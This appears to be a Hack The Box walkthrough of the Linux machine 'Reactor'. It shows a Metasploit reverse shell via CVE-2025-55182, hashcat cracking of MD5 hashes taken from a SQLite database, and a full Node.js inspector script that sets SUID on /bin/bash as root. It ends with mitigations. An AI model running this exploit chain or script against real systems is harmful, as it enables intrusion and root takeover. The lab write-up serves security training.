---
title: "HTB Walkthrough: Reactor"
date: 2026-10-04
draft: false
description: "Full walkthrough of the Reactor machine from Hack The Box. Easy difficulty, Linux. Unauthenticated RCE on Next.js 15 (CVE-2025-55182) → SQLite database with MD5 hashes → hashcat cracking → SSH as engineer → root via Node.js Inspector WebSocket RCE (port 9229)."
tags: ["HackTheBox", "Linux", "Easy", "NextJS", "CVE-2025-55182", "RSC", "RCE", "SQLite", "MD5", "HashCracking", "NodejsInspector", "CDP", "WebSocket", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Reactor** on Hack The Box. **Easy** difficulty machine running **Linux**. Port 3000 serves a **Next.js 15.0.3** application vulnerable to **CVE-2025-55182**: unauthenticated RCE via the React Server Components endpoint. From the shell as `node`, a SQLite database exposes MD5 password hashes; the `engineer` hash is cracked with `hashcat` + `rockyou.txt`, giving SSH access. As `engineer`, `ps aux` reveals root is running `node --inspect=127.0.0.1:9229` — the **Node.js Inspector** exposes the CDP protocol with no authentication, allowing arbitrary JavaScript execution as root via `Runtime.evaluate`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                                          |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | Reactor                                                                                                                                          |
| **OS**         | Linux (Ubuntu)                                                                                                                                   |
| **Difficulty** | Easy                                                                                                                                             |
| **IP**         | 10.129.2.180                                                                                                                                     |
| **Techniques** | CVE-2025-55182 Next.js RSC RCE · SQLite MD5 hash cracking · Node.js Inspector WebSocket CDP · `Runtime.evaluate` as root                        |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.2.180
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

### 1.2 Version Detection on Port 3000

```bash
nmap -sC -sV -p3000 10.129.2.180
```

```
PORT     STATE SERVICE VERSION
3000/tcp open  http    Next.js
| X-Powered-By: Next.js
| x-nextjs-cache: HIT
| Content-Type: text/html; charset=utf-8
```

> **💡 Attack surface:** port 3000 serves a **Next.js** application. The `X-Powered-By: Next.js` header confirms the framework. Browsing to the page visually confirms version **15.0.3**, vulnerable to **CVE-2025-55182**.

---

## 2. Vulnerability Identified — CVE-2025-55182

Next.js 15.0.3 is vulnerable to **CVE-2025-55182**: unauthenticated RCE via **React Server Components (RSC)**.

Next.js implements RSC with a special endpoint that processes RSC requests. In vulnerable versions, this endpoint accepts payloads containing serialised JavaScript that is evaluated on the server without any validation or authentication check. Any attacker with network access can send the payload and obtain code execution in the context of the server's Node.js process.

> **⚠️ Vulnerable version:** Next.js **15.0.3** — CVE-2025-55182 allows pre-authentication RCE through the React Server Components endpoint.

---

## 3. Exploitation — CVE-2025-55182 via Metasploit

```bash
msf6 > search Next.js
```

```
0  exploit/multi/http/react2shell_unauth_rce_cve_2025_55182  2025-12-03  excellent  Yes
   Unauthenticated RCE in React Server Components (React2Shell)
```

```bash
msf6 > use 0
msf6 exploit(...) > set RHOSTS 10.129.2.180
msf6 exploit(...) > set RPORT 3000
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
```

```
[*] Started reverse TCP handler on 10.10.14.211:4444
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.14.211:4444 -> 10.129.2.180:42652)
```

```
Normal flow:    legitimate RSC request → Next.js renders server components → HTML to client
Malicious flow: RSC payload with serialised JS → evaluated on server without validation
                → execSync reverse shell → outbound connection → shell as node
```

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

---

## 4. User Flag — Post-Exploitation Enumeration

### 4.1 SQLite Database with Credentials

```bash
node@reactor:/opt/reactor-app$ ls
app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
```

```sql
sqlite> .tables
sensor_logs  users

sqlite> SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

> **💡 Key finding:** two plain MD5 hashes inside a SQLite file accessible from the application directory. MD5 without salt is trivially fast to crack with GPU hardware.

### 4.2 Hash Cracking with Hashcat

```bash
hashcat -a 0 -m 0 a203b22191d744a4e70ada5c101b17b8 /usr/share/wordlists/rockyou.txt
# → Not found
```

```bash
hashcat -a 0 -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt
```

```
39d97110eafe2a9a68639812cd271e8e:reactor1

Status: Cracked
Time: < 1 second
```

> **🔑 Credentials obtained:** `engineer : reactor1`

### 4.3 SSH Access

```bash
ssh engineer@10.129.2.180
# Password: reactor1
```

```bash
cat /home/engineer/user.txt
```

> 🔑 User flag obtained.

---

## 5. Privilege Enumeration — Node.js Inspector

```bash
ps aux | grep node
```

```
root  1400  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

> **⚠️ Critical exposure:** `worker.js` runs as **root** with the `--inspect=127.0.0.1:9229` flag. This activates the **Node.js Inspector** — a remote debugging interface that allows executing arbitrary JavaScript in the process via WebSockets, with no authentication. Being bound to `127.0.0.1` only means it's not reachable externally — any local user with a shell can connect directly.

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "description": "node.js instance",
  "id": "3b81a7fd-0931-41d2-af32-1e64b26b05b9",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/3b81a7fd-0931-41d2-af32-1e64b26b05b9"
}]
```

The `/json` endpoint returns the **WebSocket ID** of the process — the URL to connect a CDP client to.

---

## 6. Privilege Escalation — WebSocket CDP → `Runtime.evaluate` as Root

The Node.js Inspector exposes the **Chrome DevTools Protocol (CDP)**. The `Runtime.evaluate` method executes any JavaScript expression in the context of the process — here, a root process — with no authentication required.

### 6.1 CDP Exploitation Script

```javascript
// /tmp/pwn.js — Connects to Node.js inspector via WebSocket and executes code as root
const net    = require('net');
const crypto = require('crypto');

const WS_ID = '3b81a7fd-0931-41d2-af32-1e64b26b05b9';

function maskedFrame(msg) {
    const payload = Buffer.from(msg, 'utf8');
    const mask    = crypto.randomBytes(4);
    const len     = payload.length;
    let header;
    if (len < 126) {
        header = Buffer.alloc(6);
        header[0] = 0x81;
        header[1] = 0x80 | len;
        mask.copy(header, 2);
    } else {
        header = Buffer.alloc(8);
        header[0] = 0x81;
        header[1] = 0x80 | 126;
        header.writeUInt16BE(len, 2);
        mask.copy(header, 4);
    }
    const masked = Buffer.alloc(payload.length);
    for (let i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i % 4];
    return Buffer.concat([header, masked]);
}

function parseFrame(buf) {
    const b1  = buf[1] & 0x7f;
    let offset = 2, len = b1;
    if (b1 === 126) { len = buf.readUInt16BE(2); offset = 4; }
    return buf.slice(offset, offset + len).toString();
}

const key    = crypto.randomBytes(16).toString('base64');
const socket = net.connect(9229, '127.0.0.1', () => {
    socket.write([
        `GET /${WS_ID} HTTP/1.1`,
        'Host: 127.0.0.1:9229',
        'Upgrade: websocket',
        'Connection: Upgrade',
        `Sec-WebSocket-Key: ${key}`,
        'Sec-WebSocket-Version: 13',
        '\r\n'
    ].join('\r\n'));
});

let upgraded = false;

socket.on('data', d => {
    if (!upgraded && d.toString().includes('101')) {
        upgraded = true;
        const msg = JSON.stringify({
            id: 2,
            method: 'Runtime.evaluate',
            params: {
                expression: `process.mainModule.require('child_process')
                             .execSync('chmod +s /bin/bash').toString()`,
                returnByValue: true
            }
        });
        socket.write(maskedFrame(msg));
        return;
    }
    if (upgraded) {
        try {
            const json = JSON.parse(parseFrame(d));
            if (json.id === 2) console.log('[+] Executed as root.');
        } catch(e) {}
    }
});

setTimeout(() => process.exit(), 8000);
```

> **💡 Why it works:** `--inspect` exposes the CDP WebSocket server with no authentication. `Runtime.evaluate` executes the expression in the root process context with full privileges. The WebSocket frame mask is mandatory for client-to-server traffic (RFC 6455) — without it the server drops the connection.

### 6.2 Execution

```bash
node /tmp/pwn.js
```

```
[+] Executed as root.
```

```bash
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1396520 /bin/bash
```

```bash
/bin/bash -p
bash-5.1# whoami
root
```

```
Normal flow:    --inspect bound to 127.0.0.1 → accessible only locally for debugging
Malicious flow: local user with shell → WebSocket CDP → Runtime.evaluate
                → execSync as root → SUID on /bin/bash → /bin/bash -p → EUID 0
```

---

## 7. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 8. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap reveals ports 22 and 3000. Version detection confirms Next.js on port 3000.
2. **CVE-2025-55182** → Pre-auth RCE via Next.js 15.0.3 RSC endpoint → shell as `node` with Metasploit.
3. **SQLite** → `reactor.db` in `/opt/reactor-app/` exposes MD5 password hashes. `hashcat -m 0` + `rockyou.txt` cracks `engineer`'s hash → password `reactor1`.
4. **User flag** → `ssh engineer@10.129.2.180` → `/home/engineer/user.txt`.
5. **Node.js Inspector** → `ps aux` reveals `root` running `node --inspect=127.0.0.1:9229 worker.js`. `curl :9229/json` returns the process WebSocket ID.
6. **CDP RCE** → WebSocket script with `Runtime.evaluate` → `chmod +s /bin/bash` as root → `/bin/bash -p` → EUID 0.

**What I learned from this machine:**

- **CVE-2025-55182 shows that React Server Components are an attack surface if serialised input is not validated.** The Next.js RSC endpoint evaluates payloads on the server. Without authentication and without validating the payload's origin, any arbitrary request is RCE. The fix requires patching Next.js and never exposing RSC applications without perimeter authentication.

- **MD5 without salt is not password storage — it is reversible password storage.** An MD5 hash of `reactor1` cracks in under a second with any modern GPU and `rockyou.txt`. MD5's cost function was designed for speed, not passwords. bcrypt, scrypt, and Argon2 exist precisely for this problem.

- **`--inspect` in production is RCE for any local user.** The flag starts a CDP WebSocket server with no authentication. Node.js's own documentation is explicit: "Anyone who can connect to that host:port has full debugger access." In production `--inspect` must never be used; if remote debugging is needed, the correct approach is SSH tunnelling over a Unix socket.

- **Root processes accessible from unprivileged users via `localhost` are a privilege escalation.** The `127.0.0.1` binding only prevents external access — on a multi-user system any local user with a shell can connect. The process should run as a dedicated user without a shell and without access to system resources.

- **Separating the application user from the filesystem is the first line of defence.** The SQLite database with credential hashes was in the application directory, readable by the `node` user. File permissions and user separation would have stopped the escalation at that point.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| CVE-2025-55182 — Pre-auth RCE on Next.js 15.0.3 | Update Next.js to a patched version; never expose RSC applications without perimeter authentication |
| Unsalted MD5 hashes in SQLite accessible from the application | Use bcrypt, scrypt, or Argon2 with a random per-user salt; restrict read permissions on the database file |
| Weak password (`reactor1`) in common wordlists | Enforce strong password policies; audit new passwords against known leaked dictionaries |
| `--inspect` in production with no authentication | Never use `--inspect` in production; for remote debugging, use SSH tunnelling over a Unix socket; restrict port 9229 with an internal firewall |
| Root process with inspector accessible by local unprivileged users | Run services under a dedicated account without a shell; separate the production process from any debugging interface; isolate with namespaces or containers |
